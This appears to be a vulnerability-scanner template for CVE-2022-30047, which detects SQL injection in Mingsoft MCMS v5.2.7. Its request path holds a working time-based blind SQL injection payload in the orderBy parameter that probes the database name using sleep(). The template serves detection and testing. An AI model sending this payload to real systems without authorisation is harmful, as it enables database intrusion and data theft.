id: CVE-2022-30047

info:
  name: Mingsoft MCMS v5.2.7 SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: Mingsoft MCMS v5.2.7 was discovered to contain a SQL injection vulnerability in /mdiy/dict/listExcludeApp URI via orderBy parameter.
  reference:
    - https://gitee.com/mingSoft/MCMS/issues/I54VLM

http:
  - method: GET
    path:
      - "{{BaseURL}}/mdiy/dict/listExcludeApp?dictType=1&orderBy=1;select/**/if(substring((select/**/database()),1,4)=\'mcms\',sleep(3),1);"

    matchers:
      - type: dsl
        dsl:
          - "duration>=5"